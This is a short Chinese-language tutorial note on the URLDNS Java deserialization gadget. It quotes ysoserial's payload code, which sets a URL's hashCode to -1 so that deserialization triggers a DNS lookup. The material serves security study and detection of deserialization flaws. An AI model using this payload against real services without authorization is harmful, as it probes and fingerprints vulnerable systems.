# Java反序列化之URLDNS

# payload

看看Ysoserial的payload，很简单的

```
URLStreamHandler handler = new SilentURLStreamHandler();

HashMap ht = new HashMap(); // HashMap that will contain the URL
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
```